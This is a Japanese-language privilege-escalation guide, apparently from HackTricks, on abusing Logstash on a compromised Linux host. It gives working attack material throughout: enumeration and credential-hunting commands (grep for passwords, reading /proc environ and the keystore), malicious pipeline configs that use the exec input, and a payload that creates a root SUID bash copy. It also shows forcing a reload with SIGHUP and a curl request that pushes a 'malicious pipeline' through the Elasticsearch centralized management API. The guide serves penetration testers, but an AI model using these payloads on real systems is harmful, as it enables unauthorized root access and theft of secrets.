# Logstash 権限昇格

## Logstash

Logstash は、**pipelines** と呼ばれるシステムを通じて **ログを収集、変換、配信** するために使用されます。これらの pipelines は、**input**、**filter**、**output** の各ステージで構成されます。<sup>[[4]](#references)</sup> Logstash が侵害されたマシン上で動作している場合、興味深い点が生じます。

### Pipeline 設定

Debian および RPM パッケージのインストールでは、pipelines は **/etc/logstash/pipelines.yml** を通じて設定されます。このファイルには pipeline 設定の場所が記載されています。それ以外のディストリビューションでは、`pipelines.yml` は Logstash の `path.settings` ディレクトリに配置されます。<sup>[[5]](#references)[[6]](#references)</sup>
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
このファイルから、pipeline configurationsを含む **.conf** ファイルの場所がわかります。**Elasticsearch output**を使用している場合は、`user`/`password`、`cloud_auth`、または `api_key` の設定を確認してください。アカウントの実効権限は Elasticsearch に依存します。`path.config` の glob は、その pipeline に対して一致するすべてのファイルを読み込みます。<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Logstash が `pipelines.yml` ではなく `-f <directory>` で起動されている場合、`-f` が優先され、**そのディレクトリ内のすべてのファイルが辞書順に連結され、単一の config として解析されます**。<sup>[[6]](#references)[[7]](#references)</sup> これには、攻撃上、次の2つの意味があります。

- `000-input.conf` や `zzz-output.conf` のように配置したファイルによって、最終的な pipeline の組み立て方を変更できる
- 不正な形式のファイルがあると、連結された config の validation に失敗する可能性がある。reload 中、Logstash は以前の pipeline を保持するため、auto-reload を利用する前に payloads を検証してください。<sup>[[1]](#references)</sup>

### Compromised Host 上での高速な Enumeration

Logstash がインストールされている box では、次の項目をすばやく確認します：
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
また、local monitoring API にアクセス可能かどうかも確認します。デフォルトでは **127.0.0.1:9600** にバインドされます。これは通常、host に侵入した後で十分です。<sup>[[8]](#references)</sup>
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
これらの endpoints は pipeline IDs、settings、runtime metrics、config-reload の成功／失敗カウンターを公開し、変更が受け入れられたかどうかの確認に役立ちます。<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

復元した credential が **Elasticsearch** を対象としている場合は、[Elasticsearch に関するこちらの別ページ](../../network-services-pentesting/9200-pentesting-elasticsearch.md)を確認してください。

### 書き込み可能な Pipelines を介した Privilege Escalation

Privilege Escalation を試みるには、まず Logstash service が実際にどの user で実行されているかを特定します。root または **logstash** user であると assume してはいけません。以下の**いずれか 1 つ**の条件を満たしていることを確認してください。

- pipeline の **.conf** file に対する **write access** を持っている **または**
- **/etc/logstash/pipelines.yml** file が wildcard を使用しており、対象 folder に write できる。<sup>[[6]](#references)[[7]](#references)</sup>

さらに、以下の条件の**いずれか 1 つ**を満たす必要があります。

- Logstash service を restart する capability がある **または**
- **/etc/logstash/logstash.yml** file に `config.reload.automatic: true` が設定されている。<sup>[[1]](#references)[[15]](#references)</sup>

configuration に wildcard がある場合、その wildcard に一致する file を作成することで command execution が可能になります。<sup>[[7]](#references)[[9]](#references)</sup> 例えば：
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
ここで、**interval** は実行頻度を秒単位で決定します。提示した例では、**whoami** コマンドが 120 秒ごとに実行され、その出力が **/tmp/output.log** に送られます。<sup>[[9]](#references)</sup>

**/etc/logstash/logstash.yml** で **config.reload.automatic: true** を設定すると、Logstash は再起動を必要とせずに、新規または変更された pipeline 設定を自動的に検出して適用します。<sup>[[1]](#references)[[15]](#references)</sup> ワイルドカードがない場合でも既存の設定を変更できますが、サービスの中断を避けるため注意が必要です。

### より信頼性の高い Pipeline Payload

`exec` input plugin は現在のリリースでも動作し、**interval** または **schedule** のいずれかが必要です。これは Logstash JVM を **fork** して実行するため、メモリに余裕がない場合、payload は暗黙に実行されるのではなく、`ENOMEM` で失敗する可能性があります。<sup>[[9]](#references)</sup>

サービスに root 所有の SUID ファイルを作成するための十分な権限がある場合、実用的な privilege-escalation payload は、永続的な artifact を残すものです：
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
restart 権限がなくてもプロセスに signal を送信できる場合、Logstash は Unix-like systems で **SIGHUP** によってトリガーされる reload もサポートしています。<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
すべての plugin が reload に対応しているわけではない点に注意してください。たとえば、**stdin** input は自動 reload を妨げるため、`config.reload.automatic` が常に変更を反映すると考えてはいけません。<sup>[[1]](#references)</sup>

### Logstash から Secrets を窃取する

code execution だけに注目する前に、Logstash がすでにアクセスできるデータを収集します。

- Credentials は `elasticsearch {}` outputs、`http_poller` の URLs/settings、JDBC inputs、または cloud 関連の settings に現れる可能性があります。これらの plugins には、検索する価値のある credential fields があります。<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Secure settings は **`/etc/logstash/logstash.keystore`** または別の `path.settings` directory に保存されている可能性があります。<sup>[[5]](#references)[[10]](#references)</sup>
- Keystore password は **`LOGSTASH_KEYSTORE_PASS`** を通じて渡される場合があり、RPM/DEB installs は service environment variables を **`/etc/sysconfig/logstash`** から読み込みます。<sup>[[10]](#references)</sup>
- `${VAR}` による Environment-variable expansion は Logstash startup 時に解決されるため、service environment を調査する価値があります。<sup>[[14]](#references)</sup>

役立つ checks:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
これは確認する価値もあります。**CVE-2023-46672** により、特定の状況下では、Logstash が keystore に保存された secrets や設定から参照された secrets など、機密情報をログに記録していたことが明らかになりました。そのような状況が該当する可能性がある場合は、古い Logstash ログと `journald` エントリを確認してください。<sup>[[3]](#references)</sup>

### Centralized Pipeline Management の悪用

一部の環境では、ホストはローカルの `.conf` ファイルにまったく依存していません。**`xpack.management.enabled: true`** が設定されている場合、Logstash は Elasticsearch/Kibana から中央管理された Pipeline を取得できます。このモードを有効にすると、ローカルの Pipeline 設定は source of truth ではなくなります。<sup>[[2]](#references)</sup>

つまり、別の攻撃経路が存在します。

1. ローカルの Logstash 設定、keystore、またはログから Elastic credentials を取得します。<sup>[[3]](#references)[[10]](#references)</sup>
2. アカウントが **`manage_logstash_pipelines`** cluster privilege を持っているか確認します。<sup>[[16]](#references)</sup>
3. 中央管理された Pipeline を作成または置き換え、次の poll interval で Logstash ホストに payload を実行させます。<sup>[[2]](#references)[[16]](#references)</sup>

この機能で使用される Elasticsearch API は次のとおりです。<sup>[[16]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"last_modified": "2026-01-02T02:50:51.250Z",
"username": "user",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {
"pipeline.workers": 1,
"pipeline.batch.size": 1,
"pipeline.batch.delay": 50,
"queue.type": "memory",
"queue.max_bytes": "1gb",
"queue.checkpoint.writes": 1024
}
}'
```
これは、ローカルファイルが読み取り専用である一方、Logstash がすでにリモートから pipeline を取得するよう登録されている場合に特に有用です。<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Config ファイルの再読み込み](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Centralized Pipeline Management の設定](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 Security Update (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Logstash Pipeline の作成](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Logstash Directory Layout](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: 複数の Pipeline](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Command Line からの Logstash の実行](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: API による Logstash の Monitoring](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Exec input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Secure settings 用の Secrets keystore](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Elasticsearch output plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Http_poller input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Jdbc input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: 環境変数の使用](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Logstash pipeline の作成または更新](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Pipeline の設定の取得](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Pipeline の統計情報の取得](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
